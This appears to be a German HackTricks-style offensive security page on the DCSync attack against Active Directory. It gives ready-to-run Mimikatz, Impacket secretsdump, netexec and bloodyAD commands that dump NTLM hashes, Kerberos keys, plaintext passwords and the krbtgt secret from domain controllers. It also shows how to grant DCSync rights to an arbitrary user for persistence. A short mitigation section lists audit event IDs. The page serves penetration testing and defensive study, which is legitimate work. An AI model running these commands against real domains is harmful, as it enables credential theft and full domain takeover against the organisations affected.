# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Die **DCSync**-Berechtigung setzt voraus, dass über die Domäne selbst folgende Berechtigungen vorhanden sind: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** und **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Wichtige Hinweise zu DCSync:**

- Der **DCSync-Angriff simuliert das Verhalten eines Domain Controllers und fordert andere Domain Controllers dazu auf, Informationen zu replizieren**, indem er das Directory Replication Service Remote Protocol (MS-DRSR) verwendet. Da MS-DRSR eine gültige und notwendige Funktion von Active Directory ist, kann es nicht ausgeschaltet oder deaktiviert werden.
- Standardmäßig verfügen nur die Gruppen **Domain Admins, Enterprise Admins, Administrators und Domain Controllers** über die erforderlichen Berechtigungen.
- In der Praxis benötigt **vollständiges DCSync** **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** im Domänennamenskontext. `DS-Replication-Get-Changes-In-Filtered-Set` wird üblicherweise gemeinsam mit diesen Berechtigungen delegiert, ist allein jedoch eher für die Synchronisierung von **vertraulichen / RODC-gefilterten Attributen** relevant (beispielsweise Secrets im Stil von Legacy-LAPS) als für einen vollständigen krbtgt-Dump.<sup>[[2]](#references)</sup>
- Wenn Passwörter von Konten mit reversibler Verschlüsselung gespeichert werden, ist in Mimikatz eine Option verfügbar, um das Passwort im Klartext zurückzugeben.

### Enumeration

Überprüfe mit `powerview`, wer über diese Berechtigungen verfügt:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
Wenn du dich auf **nicht standardmäßige Principals** mit DCSync-Rechten konzentrieren möchtest, filtere die integrierten, zur Replikation fähigen Gruppen heraus und überprüfe nur unerwartete Trustees:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Lokal ausnutzen
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Remote ausnutzen
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Praktische Beispiele mit begrenztem Umfang:<sup>[[1]](#references)</sup>
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### DCSync mit einem erfassten DC-Machine-TGT (ccache)

In Szenarien mit unconstrained-delegation im Export-Modus können Sie ein Domain-Controller-Machine-TGT erfassen (z. B. `DC1$@DOMAIN` für `krbtgt@DOMAIN`). Anschließend können Sie diesen ccache verwenden, um sich als DC zu authentifizieren und DCSync ohne Passwort durchzuführen.<sup>[[5]](#references)</sup>
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Betriebshinweise:

- **Impackets Kerberos-Pfad greift zuerst auf SMB zu**, bevor der DRSUAPI-Aufruf erfolgt. Wenn die Umgebung die **SPN target name validation** erzwingt, kann ein vollständiger Dump mit `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user` fehlschlagen.
- Fordere in diesem Fall entweder zuerst ein **`cifs/<dc>`**-Service-Ticket für den Ziel-DC an oder verwende als Fallback **`-just-dc-user`** für das Konto, das du sofort benötigst.
- Wenn du nur über geringere Replikationsberechtigungen verfügst, kann eine LDAP-/DirSync-ähnliche Synchronisierung weiterhin **confidential** oder **RODC-filtered** Attribute offenlegen (beispielsweise das Legacy-Attribut `ms-Mcs-AdmPwd`), ohne eine vollständige krbtgt-Replikation.<sup>[[2]](#references)</sup>

`-just-dc` generiert 3 Dateien:

- eine mit den **NTLM-Hashes**
- eine mit den **Kerberos-Schlüsseln**
- eine mit Klartextpasswörtern aus der NTDS für alle Konten, bei denen [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) aktiviert ist. Benutzer mit aktivierter reversibler Verschlüsselung findest du mit

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistenz

Wenn du ein Domain Admin bist, kannst du diese Berechtigungen mithilfe von PowerView jedem Benutzer gewähren:<sup>[[3]](#references)</sup>
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Linux-Operatoren können dasselbe mit `bloodyAD` tun:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Dann kannst du **überprüfen, ob dem Benutzer die 3 Berechtigungen korrekt zugewiesen wurden**, indem du in der Ausgabe nach ihnen suchst (die Namen der Berechtigungen sollten im Feld „ObjectType“ sichtbar sein):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

- Security Event ID 4662 (Audit Policy für Objekte muss aktiviert sein) – Eine Operation wurde an einem Objekt durchgeführt<sup>[[4]](#references)</sup>
- Security Event ID 5136 (Audit Policy für Objekte muss aktiviert sein) – Ein Verzeichnisdienstobjekt wurde geändert
- Security Event ID 4670 (Audit Policy für Objekte muss aktiviert sein) – Berechtigungen für ein Objekt wurden geändert
- AD ACL Scanner – ACLs erstellen und Berichte erstellen und vergleichen. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket Änderungsprotokoll](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Replication Get-Changes und Get-Changes-In-Filtered-Set nutzen](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Passwort-Hashes vom Domain Controller dumpen](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
